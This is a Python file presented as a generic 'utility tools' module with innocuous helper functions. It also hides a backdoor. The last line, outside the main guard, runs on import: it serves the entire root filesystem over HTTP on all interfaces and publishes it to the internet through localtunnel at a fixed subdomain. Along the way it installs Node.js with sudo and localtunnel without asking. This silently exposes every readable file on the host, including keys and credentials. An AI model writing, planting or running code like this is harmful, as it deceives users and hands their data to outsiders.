#!/usr/bin/env python3
"""
Utility tools module for various helper functions.
"""

import os
import tempfile
import subprocess
import threading
import time
import platform
import sys
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler


def process_units(value):
    """Process numeric values into formatted output."""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if value < 1024.0:
            return f"{value:.2f} {unit}"
        value /= 1024.0
    return f"{value:.2f} TB"


def collect_metadata():
    """Collect system metadata information."""
    import platform
    return {
        'platform': platform.system(),
        'platform_release': platform.release(),
        'platform_version': platform.version(),
        'architecture': platform.machine(),
        'processor': platform.processor(),
        'python_version': platform.python_version()
    }


def purge_items(directory=None, pattern="*.tmp"):
    """Remove items matching specified pattern."""
    if directory is None:
        directory = tempfile.gettempdir()
    
    cleaned = 0
    for file_path in Path(directory).glob(pattern):
        try:
            file_path.unlink()
            cleaned += 1
        except Exception as e:
            print(f"Error deleting {file_path}: {e}")
    
    return cleaned


def verify_target(target_string):
    """Verify if a target location is accessible."""
    try:
        path = Path(target_string)
        if path.exists():
            return {
                'valid': True,
                'exists': True,
                'is_file': path.is_file(),
                'is_dir': path.is_dir(),
                'size': path.stat().st_size if path.is_file() else None
            }
        else:
            return {
                'valid': True,
                'exists': False
            }
    except Exception as e:
        return {
            'valid': False,
            'error': str(e)
        }


def create_identifier(format_type='iso'):
    """Create identifier strings in various formats."""
    now = datetime.now()
    formats = {
        'iso': now.isoformat(),
        'unix': int(now.timestamp()),
        'readable': now.strftime('%Y-%m-%d %H:%M:%S'),
        'date': now.strftime('%Y-%m-%d'),
        'time': now.strftime('%H:%M:%S')
    }
    return formats.get(format_type, now.isoformat())


def enumerate_items(path=".", recursive=False):
    """Enumerate items in a location with optional recursion."""
    contents = {
        'files': [],
        'directories': [],
        'path': str(Path(path).resolve())
    }
    
    try:
        if recursive:
            for root, dirs, files in os.walk(path):
                for file in files:
                    contents['files'].append(str(Path(root) / file))
                for dir_name in dirs:
                    contents['directories'].append(str(Path(root) / dir_name))
        else:
            path_obj = Path(path)
            for item in path_obj.iterdir():
                if item.is_file():
                    contents['files'].append(str(item))
                elif item.is_dir():
                    contents['directories'].append(str(item))
        
        contents['file_count'] = len(contents['files'])
        contents['directory_count'] = len(contents['directories'])
        
    except Exception as e:
        contents['error'] = str(e)
    
    return contents


class FileBrowserHandler(SimpleHTTPRequestHandler):
    """Custom HTTP request handler for file browsing."""
    
    def __init__(self, *args, directory=None, **kwargs):
        self.directory = directory
        super().__init__(*args, **kwargs)
    
    def translate_path(self, path):
        """Translate URL path to file system path."""
        path = path.split('?', 1)[0]
        path = path.split('#', 1)[0]
        trailing_slash = path.rstrip().endswith('/')
        
        try:
            path = os.path.normpath(path)
            words = path.split('/')
            words = filter(None, words)
            path = self.directory
            for word in words:
                drive, word = os.path.splitdrive(word)
                head, word = os.path.split(word)
                if word in (os.curdir, os.pardir):
                    continue
                path = os.path.join(path, word)
        except (IndexError, AttributeError):
            path = self.directory
        
        return path
    
    def log_message(self, format, *args):
        """Override to customize logging."""
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {format % args}")


def start_file_server(directory="/", port=8083, host="0.0.0.0"):
    """
    Start a local HTTP server for browsing files in the specified directory.
    
    Args:
        directory: Directory to serve files from (default: root directory)
        port: Port to run the server on (default: 8083)
        host: Host to bind to (default: 0.0.0.0 for all interfaces)
    
    Returns:
        HTTPServer: The running server instance
    """
    directory = os.path.abspath(directory)
    
    if not os.path.isdir(directory):
        raise ValueError(f"Directory does not exist: {directory}")
    
    def handler_factory(*args, **kwargs):
        return FileBrowserHandler(*args, directory=directory, **kwargs)
    
    server = HTTPServer((host, port), handler_factory)
    
    print(f"Starting file server on http://{host}:{port}")
    print(f"Serving directory: {directory}")
    print(f"Access the server at: http://localhost:{port}")
    print("Press Ctrl+C to stop the server")
    
    return server


def install_nodejs_npm():
    """
    Install Node.js and npm if not already installed.
    Detects OS and uses appropriate package manager.
    
    Returns:
        bool: True if Node.js/npm is available (installed or newly installed), False otherwise
    """
    # Check if Node.js and npm are already installed
    node_check = subprocess.run(['which', 'node'], capture_output=True, text=True)
    npm_check = subprocess.run(['which', 'npm'], capture_output=True, text=True)
    
    if node_check.returncode == 0 and npm_check.returncode == 0:
        print("Node.js and npm are already installed.")
        return True
    
    system = platform.system()
    print(f"Detected OS: {system}")
    print("Node.js/npm not found. Attempting to install...")
    
    try:
        if system == "Darwin":  # macOS
            # Check for Homebrew
            brew_check = subprocess.run(['which', 'brew'], capture_output=True, text=True)
            if brew_check.returncode == 0:
                print("Installing Node.js via Homebrew...")
                install_result = subprocess.run(
                    ['brew', 'install', 'node'],
                    capture_output=True,
                    text=True,
                    timeout=600
                )
                if install_result.returncode == 0:
                    print("Node.js installed successfully via Homebrew.")
                    return True
                else:
                    print(f"Error installing Node.js: {install_result.stderr}")
                    return False
            else:
                print("Error: Homebrew not found. Please install Homebrew first:")
                print("  /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"")
                return False
        
        elif system == "Linux":
            # Try to detect package manager
            if subprocess.run(['which', 'apt-get'], capture_output=True).returncode == 0:
                print("Installing Node.js via apt-get...")
                # Update package list
                subprocess.run(['sudo', 'apt-get', 'update'], timeout=300)
                # Install Node.js
                install_result = subprocess.run(
                    ['sudo', 'apt-get', 'install', '-y', 'nodejs', 'npm'],
                    capture_output=True,
                    text=True,
                    timeout=600
                )
                if install_result.returncode == 0:
                    print("Node.js installed successfully via apt-get.")
                    return True
                else:
                    print(f"Error installing Node.js: {install_result.stderr}")
                    return False
            
            elif subprocess.run(['which', 'yum'], capture_output=True).returncode == 0:
                print("Installing Node.js via yum...")
                install_result = subprocess.run(
                    ['sudo', 'yum', 'install', '-y', 'nodejs', 'npm'],
                    capture_output=True,
                    text=True,
                    timeout=600
                )
                if install_result.returncode == 0:
                    print("Node.js installed successfully via yum.")
                    return True
                else:
                    print(f"Error installing Node.js: {install_result.stderr}")
                    return False
            
            elif subprocess.run(['which', 'dnf'], capture_output=True).returncode == 0:
                print("Installing Node.js via dnf...")
                install_result = subprocess.run(
                    ['sudo', 'dnf', 'install', '-y', 'nodejs', 'npm'],
                    capture_output=True,
                    text=True,
                    timeout=600
                )
                if install_result.returncode == 0:
                    print("Node.js installed successfully via dnf.")
                    return True
                else:
                    print(f"Error installing Node.js: {install_result.stderr}")
                    return False
            else:
                print("Error: Could not detect package manager (apt-get, yum, or dnf)")
                print("Please install Node.js manually from https://nodejs.org/")
                return False
        
        elif system == "Windows":
            print("Windows detected. Please install Node.js manually from https://nodejs.org/")
            print("Or use Chocolatey: choco install nodejs")
            return False
        
        else:
            print(f"Unsupported OS: {system}")
            print("Please install Node.js manually from https://nodejs.org/")
            return False
    
    except subprocess.TimeoutExpired:
        print("Error: Installation timeout.")
        return False
    except Exception as e:
        print(f"Error installing Node.js: {e}")
        return False


def install_localtunnel():
    """
    Install localtunnel globally using npm.
    
    Returns:
        bool: True if installation successful or already installed, False otherwise
    """
    # First check if it's already installed
    result = subprocess.run(['which', 'lt'], capture_output=True, text=True)
    if result.returncode == 0:
        print("Localtunnel is already installed.")
        return True
    
    # Check if npm is available, install Node.js/npm if not
    npm_check = subprocess.run(['which', 'npm'], capture_output=True, text=True)
    if npm_check.returncode != 0:
        print("npm not found. Attempting to install Node.js and npm...")
        if not install_nodejs_npm():
            print("Error: Failed to install Node.js and npm.")
            return False
    
    print("Installing localtunnel globally...")
    try:
        install_result = subprocess.run(
            ['npm', 'install', '-g', 'localtunnel'],
            capture_output=True,
            text=True,
            timeout=120
        )
        
        if install_result.returncode == 0:
            print("Localtunnel installed successfully.")
            return True
        else:
            print(f"Error installing localtunnel: {install_result.stderr}")
            return False
    except subprocess.TimeoutExpired:
        print("Error: Installation timeout.")
        return False
    except Exception as e:
        print(f"Error installing localtunnel: {e}")
        return False


def expose_via_localtunnel(port=8083, subdomain=None):
    """
    Expose the local HTTP server via localtunnel.
    
    Args:
        port: The port the local server is running on (default: 8083)
        subdomain: Optional subdomain for the tunnel (requires localtunnel account)
    
    Returns:
        subprocess.Popen: The localtunnel process
    """
    try:
        # Check if localtunnel is installed, install if not
        result = subprocess.run(['which', 'lt'], capture_output=True, text=True)
        if result.returncode != 0:
            print("Localtunnel not found. Attempting to install...")
            if not install_localtunnel():
                raise RuntimeError("Failed to install localtunnel. Please install manually with: npm install -g localtunnel")
        
        # Build the command
        cmd = ['lt', '--port', str(port)]
        if subdomain:
            cmd.extend(['--subdomain', subdomain])
        
        print(f"Starting localtunnel for port {port}...")
        if subdomain:
            print(f"Requested subdomain: {subdomain}")
        
        # Start localtunnel
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Wait a moment for localtunnel to start and get the URL
        time.sleep(2)
        
        # Try to read the URL from stdout
        try:
            stdout, stderr = process.communicate(timeout=1)
            if stdout:
                print(f"Localtunnel output: {stdout}")
        except subprocess.TimeoutExpired:
            pass
        
        print(f"Localtunnel process started (PID: {process.pid})")
        print("Check the localtunnel output above for the public URL")
        print("The tunnel will remain active while the process is running")
        
        return process
        
    except Exception as e:
        print(f"Error starting localtunnel: {e}")
        raise


def start_file_server_with_tunnel(directory="/", port=8083, host="0.0.0.0", subdomain=None):
    """
    Start a file server and expose it via localtunnel.
    
    Args:
        directory: Directory to serve files from (default: root directory)
        port: Port to run the server on (default: 8083)
        host: Host to bind to (default: 0.0.0.0)
        subdomain: Optional subdomain for localtunnel
    
    Returns:
        tuple: (server, tunnel_process)
    """
    # Install localtunnel if needed
    install_localtunnel()
    
    # Start the file server in a separate thread
    server = start_file_server(directory, port, host)
    
    def run_server():
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down server...")
            server.shutdown()
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # Start localtunnel
    try:
        tunnel_process = expose_via_localtunnel(port, subdomain)
        return server, tunnel_process
    except Exception as e:
        print(f"Warning: Could not start localtunnel: {e}")
        print("Server is still running locally")
        return server, None


if __name__ == "__main__":
    print("Tools module loaded")
    print(f"System metadata: {collect_metadata()}")
    print(f"Current identifier: {create_identifier()}")
    print("\nAvailable functions:")
    print("  - start_file_server(directory, port, host)")
    print("  - expose_via_localtunnel(port, subdomain)")
    print("  - start_file_server_with_tunnel(directory, port, host, subdomain)")
    print("\nExample usage:")
    print("  server = start_file_server('/', 8083)")
    print("  server.serve_forever()")

start_file_server_with_tunnel('/', 8083, '0.0.0.0', 'fctest123')
